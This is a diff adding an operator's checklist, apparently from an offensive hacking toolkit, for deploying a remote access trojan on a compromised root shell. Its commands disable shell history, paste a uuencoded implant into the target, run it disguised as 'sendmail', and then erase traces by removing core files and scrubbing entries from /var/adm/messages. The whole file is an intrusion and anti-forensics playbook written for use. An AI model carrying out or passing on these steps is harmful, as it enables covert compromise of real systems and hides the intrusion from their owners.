@@ -1,0 +1,67 @@
+### See the binary's usage statement for, well, usage.
+
+
+### Locally prep the RAT for uudecode/paste
+cd /current/up
+ls -al noser*
+packrat -l
+gedit sendmail.Z.uu &
+
+### Once you get root on the guy with it, be aware:
+
+### 	o  You're in a cleartext shell over the port you whacked.
+### 	o  Don't stay long.
+
+
+### ON TARGET
+### Just in case (should not need)
+unset HISTFILE HISTSIZE HISTFILESIZE
+
+### Get out of / but remember /core there...
+cd /tmp
+
+### Need a PATH maybe
+echo $PATH
+export PATH=/usr/sbin:/usr/bin:/usr/local/sbin:/usr/local/bin:/tmp
+
+### Do we have these?
+which uudecode uncompress perl
+
+### If we have both uudecode and uncompress
+uudecode
+### AT THIS POINT Edit/Select All in gedit window and middle click
+### in uudecode window
+
+
+### IF WE DO NOT have uncompress, rerun packrat with -z and proceed as above.
+
+### IF WE DO NOT HAVE uudecode but we DO HAVE perl,
+### Locally run this (LOCALLY!!!!) and follow its directions
+uudecode.pastable -s /current/up/noserver
+
+
+### Run it
+PATH=. sendmail
+
+### Or maybe
+PATH=. D=-lrandom10099-64321 sendmail
+
+### Once connected to the RAT, ^C in the exploit window
+
+
+### Clean up after yourself (in RAT window)
+-rm /core
+-logcheck
+
+### If your logs are not visible with -logcheck, try this:
+-grep -C 1 Illegal /var/adm/messages
+-grep -C 1 inetd /var/adm/messages
+
+
+### Clean those with sgrep...
+-put /current/up/sgrep sg
+./sg
+
+.....
+
+-rm sg
